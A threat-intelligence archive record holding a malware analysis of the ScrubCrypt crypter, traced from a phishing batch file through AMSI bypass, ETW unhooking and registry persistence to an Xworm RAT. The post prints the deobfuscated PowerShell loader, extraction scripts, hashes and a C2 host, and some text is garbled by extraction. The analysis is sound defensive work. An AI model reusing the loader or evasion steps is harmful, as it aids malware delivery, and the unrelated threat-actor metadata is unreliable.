{
    "id": "13757cd3-8dfb-4fc8-b05e-3688c781407e",
    "created_at": "2023-04-05T02:10:09.68745Z",
    "updated_at": "2025-03-27T02:08:40.664366Z",
    "deleted_at": null,
    "sha1_hash": "bbcf09da216c0ed6aa1840997b84f4ee3ecd2983",
    "title": "2023-03-19 - ScrubCrypt - The Rebirth of Jlaive",
    "authors": "",
    "file_creation_date": "2023-04-03T08:30:35Z",
    "file_modification_date": "2023-04-03T08:30:35Z",
    "file_size": 6183136,
    "plain_text": "# ScrubCrypt - The Rebirth of Jlaive\n\n**[0xtoxin-labs.gitbook.io/malware-analysis/malware-analysis/scrubcrypt-the-rebirth-of-jlaive](https://0xtoxin-labs.gitbook.io/malware-analysis/malware-analysis/scrubcrypt-the-rebirth-of-jlaive)**\n\nIn this blog we are going through a recent phishing campaign that leverages a new crypter sold in underground forums.\n\n## Overview\n\n[In the past weeks a new thread was posted in the \"Cryptography and Encryption Market\" section in hackforums.net promoting a new crypter](https://hackforums.net/showthread.php?tid=6228762)\ncalled \"ScrubCrypt\"\n\nScrubCrypt Selling Thread\n\n\n-----\n\ns c ypte as ou d used a ece t p s g ca pa g c e e tua y de e ed **o**\n\nWe will be going through all the analysis steps from the phishing mail the victim receives to analyzing and deobfuscating the crypter(and its\norigin) and identifying the final Xworm binary.\n\n## The Phish\n\nThe user received a mail with the subject: \"LEP/RFQ/AV/04/2022/6030\", the mail itself contains a generic body content, letting the user know\nthat he has an attachment that needs to be open.\n\nPhishing Mail\n\nThe mail has attached archive file (LEPRFQAV04,pdf.001), inside of it we can find a .bat file (batch script) that supposed to be executed by\nthe user and lead to a multistage execution chain.\n\nArchive Content\n\n## LEPRFQAV04,pdf.bat\n\n### Static Information\n\n**Sha256: 04ce543c01a4bace549f6be2d77eb62567c7b65edbbaebc0d00d760425dcd578**\n\n**VT Detection: 24/61** [(Link)](https://www.virustotal.com/gui/file/04ce543c01a4bace549f6be2d77eb62567c7b65edbbaebc0d00d760425dcd578)\n\nVT Incrimination\n\n\n-----\n\ne sc pt s co p ete y ob uscated\n\nObfuscated Batch Script\n\nBy first glance we can notice 2 main things:\n\n1. 1.\n\nThe script has junk code which utilize the % symbol in batch scripting.\n\n2. 2.\n\nThe end of the script contains a huge encrypted blob of data as a comment (::)\n\nBlob Of Data\n\n### Batch Deobfuscation\n\nI start off with removing all the junk code the script contains by using the next script:\n\nimport re\n\n​\n\nNON_WORD_PATTERN = '%\\W%'\n\nfile_path = '/Users/igal/malwares/Scrub Crypt/3 - LEPRFQAV04,pdf.bat'\n\nfo = open(file_path,'r').read()\n\nclean_script = re.sub(NON_WORD_PATTERN,'',fo)\n\nprint(clean_script)\n\n**Output:**\n\n@echo off\n\npowershell -w hidden -c #\n\nset CUnTR=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\ncopy %CUnTR% \"%~0.exe\" /y && cls\n\n\n-----\n\n% 0 e e u ct o y ($t){$t ep ace( @, )}$ qO y Get@C@u @e t@ @ oce@ss@ ;$ sa y ea@d @ @e@ t@ ;$G o y\n'En@t@ry@Poin@t@';$sdql=yA 'Ch@ange@E@xte@nsi@on@';$qzpw=yA 'From@Bas@e64S@tri@ng@';$cJIQ=yA 'Lo@@';$uGgV=yA\n'Tr@a@n@sfor@m@F@in@al@B@lo@ck@';$QlQQ=yA 'Sp@l@it@';$neAB=yA 'In@vo@ke@';$QjQB=yA\n'Cre@at@eD@ec@ry@pto@r@';function RpFzY($jAaJE,$RZzRM,$cnkfF){$DLZbE=\n\n[System.Security.Cryptography.Aes]::Create();$DLZbE.Mode=[System.Security.Cryptography.CipherMode]::CBC;$DLZbE.Padding=\n\n[System.Security.Cryptography.PaddingMode]::PKCS7;$DLZbE.Key=[System.Convert]::$qzpw($RZzRM);$DLZbE.IV=\n\n[System.Convert]::$qzpw($cnkfF);$YQiIq=$DLZbE.$QjQB();$mYMLI=$YQiIq.$uGgV($jAaJE,0,$jAaJE.Length);$YQiIq.Dispose();$DLZbE.Dispose\nAYCAO($jAaJE){$uSXLQ=New-Object System.IO.MemoryStream(,$jAaJE);$RWxVj=New-Object System.IO.MemoryStream;$YYDyP=NewObject System.IO.Compression.GZipStream($uSXLQ,\n\n[IO.Compression.CompressionMode]::Decompress);$YYDyP.CopyTo($RWxVj);$YYDyP.Dispose();$uSXLQ.Dispose();$RWxVj.Dispose();$RWxVj.T\nBxKKh($jAaJE,$RZzRM){[System.Reflection.Assembly]::$cJIQ([byte[]]$jAaJE).$GEoF.$neAB($null,$RZzRM);}$WlqMk=\n\n[System.IO.File]::$knsa([System.IO.Path]::$sdql([System.Diagnostics.Process]::$iwqO().MainModule.FileName,\n$null)).$QlQQ([Environment]::NewLine);$nwgCf=$WlqMk[$WlqMk.Length-1].Substring(2);$voaim=\n\n[string[]]$nwgCf.$QlQQ('\\');$SPONW=AYCAO (RpFzY ([Convert]::$qzpw($voaim[0])) $voaim[2] $voaim[3]);$mOxVC=AYCAO (RpFzY\n([Convert]::$qzpw($voaim[1])) $voaim[2] $voaim[3]);BxKKh $mOxVC $null;BxKKh $SPONW $null;\n\n::K8fQqk7xvojjb2P9cYvAvVZq2lXoHsKBw6gFb0XhzLyV5n92FTvZL6MK9KFRY8weBiypW/knQPmWgUurEdWUIrgCmzr2gamQnLsxndquXEgi5GK\n\nGreat, now the script is less obfuscated and we can see that there is a powershell script embedded.\nI've cleaned the script and changed some\nof the variable names:\n\n### What the script does?\n\nThe script takes the blob data I've mentioned that comes right after the :: comment in the batch script.\nIt will split it by backslash and save the\nsplitted data in a variable ($blob_data_chunk)\n\nSplit Data Function\n\nThe variable will be now an array with 4 elements:\n\nEncrypted data 1\n\nEncrypted data 2\n\nBase64 encoded AES256 encryption key\n\nBase64 encoded AES256 encryption IV\n\nThe script will pass each encrypted data with the encoded key and IV to decryption function (f_aes_decrypt), the return value from the\nfunction will be gz archive which will then be passed to a decompress function (f_decompress_data) which will return binary in a form of byte\narray.\n\n\n-----\n\nDecryption Function\n\nAnd the last thing the script will do is to invoke and execute these binaries.\nThe next script can be used to retrieve the archives:\n\nfrom Crypto.Cipher import AES\n\nfrom base64 import b64decode\n\n​\n\ndef aes_decrypt(data, key, iv):\n\ndecrypt_cipher = AES.new(key, AES.MODE_CBC, iv)\n\nreturn decrypt_cipher.decrypt(data)\n\n​\n\ndata_blob = clean_script.split('::')[-1].split('\\\\')\n\nenc_blob_1 = b64decode(data_blob[0])\n\nenc_blob_2 = b64decode(data_blob[1])\n\nkey = b64decode(data_blob[2])\n\niv = b64decode(data_blob[3])\n\narchive_1 = aes_decrypt(enc_blob_1, key, iv)\n\narchive_2 = aes_decrypt(enc_blob_2, key, iv)\n\n​\n\nfile_path = '/Users/igal/malwares/Scrub Crypt/archive'\n\nfo = open('{0}{1}.gz'.format(file_path,1),'wb').write(archive_1)\n\nfo = open('{0}{1}.gz'.format(file_path,2),'wb').write(archive_2)\n\n​\n\nNow we can go through the binaries and analyze each one of them; based on the script execution flow, the first binary that will be executed is\nthe one stored in archive2.\n\n## XsXllt.tmp\n\n\n-----\n\n### Stat c o at o\n\n**Sha256: 05eac401aa9355f131d0d116c285d984be5812d83df3a297296d289ce523a2b1**\n\n**VT Detection: 18/71** [(Link)​](https://www.virustotal.com/gui/file/05eac401aa9355f131d0d116c285d984be5812d83df3a297296d289ce523a2b1?nocache=1)\n\nVT Incrimination\n\nThe binary is .NET based as we can inspect using DiE\n\nDiE Analysis\n\nI've opened the binary in DnSpy and found out it's obfuscated:\n\nObfuscated Binary In DnSpy\n\n### Breaking the deobfuscation\n\nI will be going through now a way I've managed to deobfuscate the code and make it text clear. First of all, we open up\n**SAE(SimpleAssemblyExplorer) and navigate to the location where the binary is located, right click on the binary and select \"Deobfuscator\":**\n\nDeobfuscator Option In SAE\n\nThen we simply click OK and waiting for SAE to deobfuscate for us the code:\n\n\n-----\n\nSAE Deobfuscation Process\n\nNow we can open up the binary and find out that it's a bit more clearer then previously:\n\nSemi Cleaned Binary\n\nBut this is not enough, we can see that there is a repetitive method being used by the program c000001.m000001, we can use De4Dot and\ndeobfuscate the code even more, one thing that we need for it is the method token (which can be retrieved by clicking the method and looking\non the comment above it):\n\nMethod Token\n\nNow that we have the token we can use the next command to deobfuscate the code: de4dot.exe <SAE_deobfuscated_binary> --strtyp\n```\ndelegate --strtok 06000001\n\n```\nAfter the deobfuscation process was succeeded, a \"clean\" binary will be created in the binary folder, we can open it in DnSpy and see how the\nmagic happens and work with a clear text binary:\n\n\n-----\n\nFully Cleaned Binary\n\n### Evasion Techniques\n\nThis binary does 2 main operations:\n1 - AMSI Bypass - The dev isn't trying to be too much creative and copycats rasta-mouse AmsiBypass C#\n[code which can be found on his github repo](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs)\n\nAMSI Bypass\n\n2- ETW Unhooking - The dev adding a layer of protection by unhooking EtwEventWrite (Event Tracing for Windows) which will disable the\n[logging for Assembly.Load calls, this topic is explained in depth by XPN.\nXPN shares a POC code for the unhooking on his github repo​](https://blog.xpnsec.com/hiding-your-dotnet-etw/)\n\n\n-----\n\nETW Unhooking\n\nAfter the execution of this binary, the second binary will be executed which is stored in Archive1 (the execution of this binary won't be logged\nin the event tracer as the unhook in the previous binary occured).\n\n## JuCdip.tmp\n\n### Static Information\n\n**Sha256: ad13c0c0dfa76575218c52bd2a378ed363a0f0d5ce5b14626ee496ce52248e7a**\n\n**VT Detection: 23/70** [(Link)​](https://www.virustotal.com/gui/file/ad13c0c0dfa76575218c52bd2a378ed363a0f0d5ce5b14626ee496ce52248e7a?nocache=1)\n\nVT Incrimination\n\nThe binary is .NET based as we can inspect using DiE\n\nDiE Analysis\n\nI've opened up the binary in DnSpy and found out it's obfuscated (for the sake of not making this blog too much long, i will skip the\n**deobfuscation process of this binary as it's the same we did with the previous one)\nThe clear code:**\n\n\n-----\n\nPost Deobfuscation Binary\n\n### Persistence & Execution\n\nNow that we have the clean code, we can go through what the binary actually does, firstly thing that I've noticed (that eventually led me to\nfinding the ScrubCrypt origin) is the name of the binary SCRUBCRYPT\n\nScrubCrypt Binary Name\n\nAfter that I've started to searching for it's origin but this will be explained later.\nThe binary does two main things:\n\n\n-----\n\n**e s ste ce O ce t e p og a** e ecuted t c eate a po e s e tas to de ete t e b a y e o t e ct s co pute o ce t e\nexecution of the program is done. Then the program creates a Mutex (iJOMzLdJpA, if the mutex already taken it will terminate itself) The\nprogram will then lookup in the registry and in the startup folder whether or not a persistence for the binary was already made. If the\nprogram couldn't find any persistence related to the binary it will create its own persistence by creating two files in the appdata folder\none file is a .bat file with the content of the initial batch file and second file which is a .vbs file that will execute the .bat file; a registry key\nwill be created under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run which will execute the .vbs file once the system is\nrebooted, the mutex then will be released and the program will execute itself again.\n\nPowerShell Task\n\nMutex Creation\n\nChecks For Previous Execution\n\nPersistence Creation\n\n\n-----\n\n**ecut o** te t e p og a as esta ted a d co ed ts o pe s ste ce t e ecute t e a pay oad c s sto ed e c ypted\nin the binary resources. The encrypted data is simply Xor'ed with a 32 byte long key (in this case:\n```\n   aZAZGrVOlgDxdyHvNzxAcXRlcnuJCRId); After the xor operation the program will decompress the payload out of the xor'ed archive. Then\n\n```\nthe program will load the final payload and invoke its EntryPoint.\n\nResource Fetching Function\n\nXor Operation & Decomperssion\n\nEntryPoint Invocation\n\nI've created a small script that will extract the resource from the binary, xor it and will save the final payload archive:\n\nimport dnfile\n\nfrom binascii import hexlify\n\n​\n\nFILEPATH = '/Users/igal/malwares/Scrub Crypt/4 - scrubcrypt binary.bin'\n\nXOR_KEY = 'aZAZGrVOlgDxdyHvNzxAcXRlcnuJCRId'\n\n​\n\ndef xor_helper(to_xor, key):\n\nkey_len = len(key)\n\ndecoded = []\n\nfor i in range(0,len(to_xor)):\n\ndecoded.append(to_xor[i] ^ key[i % key_len])\n\n\n-----\n\netu bytes(decoded)\n\n​\n\npe = dnfile.dnPE(FILEPATH)\n\n​\n\nfor rsrc in pe.net.resources:\n\nrsrc_data = xor_helper(rsrc.data, XOR_KEY.encode())\n\nfile_path = '/Users/igal/malwares/Scrub Crypt/final_payload'\n\nfo = open('{0}.gz'.format(file_path),'wb').write(rsrc_data)\n\n## The Final Payload\n\nThe purpose of the blog is mainly to cover the crypter but because the final payload being delivered by the crypter is pretty unknown we will\ncover it in few sentences.\n\n### Static Information\n\n**Sha256: 814187405811f7d0e9593ae1ddf0a43ccbd9e8a37bee7688178487eeef3860c6**\n\n**VT Detection: 41/71** [(Link)​](https://www.virustotal.com/gui/file/814187405811f7d0e9593ae1ddf0a43ccbd9e8a37bee7688178487eeef3860c6?nocache=1)\n​\n\nVT Incrimination\n\nOpening the binary in DnSpy we can see that the binary name is XWormClient\n\nXwormClient\n\nBy quick analyzing it, the malware is Xworm RAT which being sold on underground forums for a price tag of 100$\n\n\n-----\n\nXworm Selling Site\n\nThe malware is created by the EvilCoder Project and their post thread can be found in Cracked.io forum:\n\n\n-----\n\no Se g ead\n\n## ScrubCrypt Origin\n\nNow that we've covered the campaign, we can talk about the origin of the crypter.\nThe crypter is being sold on Hackforums (as mentioned on\nthe beginning of the blog) for about 40$ (for 1 month sub)\nWhen I was investigating ScrubCrypt I was suspecting that the crypter is a simple\ncopycat of a well known Batchfuscator crypter Jlaive [(Github).\nAfter reading some customers comments on the Hackforums post I've stumbled](https://github.com/ch9sh/Jlaive-Crypter)\nupon this comment:\n\nCustomer Comment\n\nWhich followed up with answer from Chash (Jlaive crypter developer):\n\nJlaive Developer Response\n\n## Conclusion\n\nIn this blogpost we went over the execution pattern of the recent rebranded Jlaive crypter, which eventually executes a RAT type malware from\nthe Xworm family.\nScrubCrypt was created for marketing reasons and keeping the name of the \"Jlaive\" crypter alive.\n\n## IOC's\n\n**Samples:**\n\n[LEPRFQAV04,pdf.001 - 28d6b3140a1935cd939e8a07266c43c0482e1fea80c65b7a49cf54356dcb58bc​](https://bazaar.abuse.ch/sample/28d6b3140a1935cd939e8a07266c43c0482e1fea80c65b7a49cf54356dcb58bc/)\nLEPRFQAV04,pdf.bat - [04ce543c01a4bace549f6be2d77eb62567c7b65edbbaebc0d00d760425dcd578​](https://bazaar.abuse.ch/sample/04ce543c01a4bace549f6be2d77eb62567c7b65edbbaebc0d00d760425dcd578)\namsi & etw.bin - [05eac401aa9355f131d0d116c285d984be5812d83df3a297296d289ce523a2b1​](https://bazaar.abuse.ch/sample/05eac401aa9355f131d0d116c285d984be5812d83df3a297296d289ce523a2b1/)\nscrubcrypt binary.bin - [ad13c0c0dfa76575218c52bd2a378ed363a0f0d5ce5b14626ee496ce52248e7a​](https://bazaar.abuse.ch/sample/ad13c0c0dfa76575218c52bd2a378ed363a0f0d5ce5b14626ee496ce52248e7a/)\n[xworm.bin - 814187405811f7d0e9593ae1ddf0a43ccbd9e8a37bee7688178487eeef3860c6​](https://bazaar.abuse.ch/sample/814187405811f7d0e9593ae1ddf0a43ccbd9e8a37bee7688178487eeef3860c6/)\n**C2:**\n\nhurricane.ydns.eu:2311\n\n\n-----\n\n## References\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-19 - ScrubCrypt - The Rebirth of Jlaive.pdf"
    ],
    "report_names": [
        "2023-03-19 - ScrubCrypt - The Rebirth of Jlaive.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1680660609,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1680510635,
    "ts_modification_date": 1680510635,
    "files": {
        "pdf": "https://archive.orkl.eu/bbcf09da216c0ed6aa1840997b84f4ee3ecd2983.pdf",
        "text": "https://archive.orkl.eu/bbcf09da216c0ed6aa1840997b84f4ee3ecd2983.txt",
        "img": "https://archive.orkl.eu/bbcf09da216c0ed6aa1840997b84f4ee3ecd2983.jpg"
    }
}